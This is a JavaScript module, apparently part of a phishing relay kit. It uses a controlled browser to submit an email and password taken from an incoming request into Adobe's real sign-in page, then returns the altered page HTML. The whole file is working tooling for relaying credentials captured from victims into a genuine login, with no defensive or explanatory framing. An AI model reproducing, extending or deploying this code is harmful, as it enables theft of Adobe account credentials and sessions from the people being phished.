const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Adobe extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]
        try {
            if (spikeType == "email") {
                let email = "#EmailPage-EmailField"
                await page.waitForSelector(email)

                await page.evaluate(() => {
                    document.querySelector("#EmailPage-EmailField").value = ""
                })

                await page.type(email, body.username)

                try {
                    await Promise.all([
                        page.click(`[data-id="EmailPage-ContinueButton"]`),
                        new Promise(re => setTimeout(re, 5000))
                    ])
                } catch (error) { }

            } else if (spikeType == "password") {
                let password = "#PasswordPage-PasswordField"
                await page.waitForSelector(password)

                await page.evaluate(() => {
                    document.querySelector("#PasswordPage-PasswordField").value = ""
                })
                await page.type(password, body.password)
                try {
                    await Promise.all([
                        page.click(`[data-id="PasswordPage-ContinueButton"]`),
                        new Promise(re => setTimeout(re, 5000))
                    ])
                } catch (error) { }

            } else {
                return await this.openTAB(true, 7000)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true, 7000)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Adobe(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true, 7000)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}